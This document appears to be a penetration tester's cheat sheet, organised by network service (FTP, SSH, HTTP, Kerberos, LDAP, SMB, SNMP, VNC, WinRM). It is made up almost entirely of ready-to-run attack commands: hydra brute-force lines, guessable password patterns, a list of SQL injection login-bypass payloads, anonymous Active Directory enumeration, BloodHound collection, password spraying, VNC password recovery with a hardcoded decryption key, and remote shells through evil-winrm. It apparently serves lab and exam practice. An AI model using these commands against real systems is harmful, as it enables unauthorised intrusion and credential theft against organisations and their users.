# FTP (tcp/21)

------

**FTP Anonymous Access**

```bash
ftp -a <ip>
```

**FTP Brute Force**

```bash
hydra -l admin -P $(locate fasttrack.txt) ftp://192.168.199.46 -I -V
```

**FTP Client Commands**

```bash
> mget * (download everything)
> get <file> (download file)
> get <file> - (print content of file)
```

# SSH (tcp/22)

**Brute Force**

```
hydra -l <username> -P <passwords> ssh://<ip>
```

# HTTP (tcp/80)

-----
## Enum

**Enum Programs/Wordlists**

```
gobuster dir -u <url> -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
```

```
gobuster dir -u <url> -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt
```

```
feroxbuster --force-recursion -u <url> -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
```

```
dirsearch -u <url>
```

```
gobuster dir -u <url> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

> [!tip] 
>  Manually recurse on found directories with `quickhits.txt`, esp on directories that could contain config files (`/config`, `/vendor` etc.)

**Empty servers might host static files**

```
gobuster dir -u <url> -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x pdf,txt,docx
```

### Usernames

**If there is a website, try to look for valid usernames for initial access**

```
Places to check:

"team", "about us" pages
HTML, css, js comments
download custom images and check metadata with exiftool
```
### Passwords

**Generate possible passwords from website content to use with found usernames**

```
cewl -d 4 <url> > passwords
```

**Add the following custom passwords to try when stuck/cewl doesn't work:**

```
any usernames found
any Usernames found
hostname
hostname01
hostname1
hostname1!
Hostname
Hostname01
Hostname1
Hostname1!
domain
domain01
domain1
domain1!
Domain
Domain01
Domain1
Domain1!
company-name
company-name01
company-name1
company-name1!
Company-Name
Company-Name01
Company-Name1
Company-Name1!
Welcome1
Welcome1!
<current season><current year> (or current when released)
```
## SQL

**Manual Payloads**

```
admin' or '1'='1
admin' or '1'='1 -- -
' or '1'='1
' or "1"="1
' or "1"="1"--
' or "1"="1"/*
' or "1"="1"#
' or 1=1
' or 1=1 --
' or 1=1 -
' or 1=1--
' or 1=1/*
' or 1=1#
' or 1=1-
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-
```

# Kerberos (tcp/88)
------

**User enum (also checks if user has PREAUTH enabled)**

```js
kerbrute_linux_arm64 userenum -d <domain> --dc <ip of dc>
```

# RPC (tcp/139, tcp/135)
-----

**Probe anonymous login**

```js
rpcclient -U '' <ip>
```

> [!tip] 
> After obtaining valid AD credentials, retry RPC auth and run the below commands.

**Useful RPC client commands**

```
queryuser

querygroup

querydominfo

enumdomusers

enumdomgroups

enumprinters

createdomuser

lookupsids

lookupnames

dsenumdomtrusts

querygroup

querygroupmem

enumalsgroups

lsaquery

netshareenumall

netsharegetinfo

lsaenumsid
```

# LDAP (tcp/389)

-------
## Anonymous Binds

**Probe anonymous LDAP binds**

```bash
nxc ldap <ip> -u '' -p ''
```

```bash
python3 ~/tools/windapsearch/windapsearch.py -d <domain> --dc-ip <IP> -U
```

```bash
ldapsearch -H ldap://<IP> -x -s base namingcontexts
```

**Get AD Info**

```bash
nxc ldap <ip> -u '' -p '' --users --groups
```

```bash
nxc ldap <ip> -u '' -p '' -M get-desc-users
```

```bash
python3 windapsearch.py -d <domain> --dc-ip <ip> -U | grep userPrincipalName | awk -F' ' '{print $2}' | cut -f1 -d "@" > users.txt
```

**Get a list of users using CME**

```bash
nxc ldap <ip> -u '' -p '' --users > temp
cat temp | awk -F' ' '{print $5}' | awk -F'\' '{print $2}' > users
```

> [!danger]
>  Results from anonymous access can be incomplete (missing users/group data). If you get results with anonymous binds, do not assume it's the complete picture. Look at other avenues for potential users (such as websites and SMB shares)

**Filter out LDAP fields which aren't useful (potentially helps to uncover descriptions or custom LDAP fields with passwords)**

```bash
python3 ~/tools/windapsearch/windapsearch.py -d <domain> --dc-ip <ip> -U --full | grep -v objectClass | grep -v whenCreated | grep -v whenChanged | grep -v uSNCreated | grep -v uSNChanged | grep -v objectGUID | grep -v userAccountControl | grep -v badPwdCount | grep -v codePage | grep -v countryCode | grep -v badPasswordTime | grep -v lastLogoff | grep -v lastLogon | grep -v scriptPath | grep -v pwdLastSet | grep -v dSCorePropagationData | grep -v objectCategory | grep -v sAMAccountType | grep -v objectSid | grep -v accountExpires | grep -v primaryGroupID | grep -v sn | grep -v instanceType | grep -v logonCount | grep -v givenName | grep -v displayName | grep -v sAMAccountName
```
## Bloodhound

**Remote ingest**

```bash
bloodhound-python -u <user> -p <pass> -dc <FQDN> -d <DOMAIN> -c all --zip -ns <IP> --dns-timeout 30
```

**Local ingest**

```js
.\SharpHound.exe --CollectionMethods All
```

```js
. .\SharpHound.ps1

Invoke-Bloodhound --CollectionMethods All
```

# SNMP (udp/161)

----

**Fast UDP scan (run multiple times)**

```bash
sudo nmap -sU -min-rate 1000 <ip> 
```

**Access data quickly**

```bash
snmpbulkwalk -c public -v2c <ip> .
```

**Get extended/secret objects (always try both)**

```bash
snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP] NET-SNMP-EXTEND-MIB::nsExtendObjects
```

```bash
snmpwalk -v X -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

# SMB (tcp/445)

------
## Anonymous and NULL auth

**Check NULL auth**

```bash
smbmap -u null -H <ip>
```

```bash
nxc smb <ip> -u 'null' -p '' --shares
```

**Check anonymous auth** (different than anonymous)

```bash
nxc smb <ip> -u '' -p ''
```

**Connect to share via Anonymous auth (don't specify username/pass, just hit enter)** 

```js
smbclient \\\\<ip>\\<share>
```

**Connect to share via null auth**

```js
smbclient \\\\<ip>\\<share> -U null
```

## SMBClient 

**Recursively download everything in share**

```js
> recurse on
> prompt off
> mget *
```

## Password Spraying

```js
nxc smb <ip> -u users -p passwords --shares --groups --users
```


> [!tip] 
> Always try with `--local-auth` when spraying!


```js
nxc smb <ip> -u <user> -p <pass> --shares --groups --users --local-auth
```

# VNC (tcp/5800)

-----
## Connect

```js
vncviewer <IP>:<PORT>
```

## Find VNC password

#### Linux

```
~/.vnc/passwd
```

#### Windows

```
# RealVNC
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver

# TightVNC
HKEY_CURRENT_USER\Software\TightVNC\Server

# TigerVNC
HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4

# UltraVNC
C:\Program Files\UltraVNC\ultravnc.ini
```

### Manually decrypt VNC password

```
msfconsole
irb
fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07" # This doesn't change
require 'rex/proto/rfb'
Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey # this changes
/dev/nul
```

# WinRM (tcp/5985)

-----
## Password Spraying

```js
nxc winrm <ip> -u users -p passwords 
```


> [!tip] 
> Always try with `--local-auth` when spraying!


```js
nxc smb <ip> -u <user> -p <pass> --local-auth
```

## Evil-WinRM

```bash
evil-winrm -u <user> -p <pass> -i <ip>
```

## WinRM-Kerb-Shell

**Useful for when NTLM is disabled, or you only have access to a ccache without knowledge of a password**

```
export KRB5CCNAME=$(pwd)/something.ccache
./winrm_kerb_shell.rb -s <FQDN> -r DOMAIN.COM
```

> [!danger] 
> `something.ccache` needs to be a service ticket for the SPN of `http/<FQDN>`

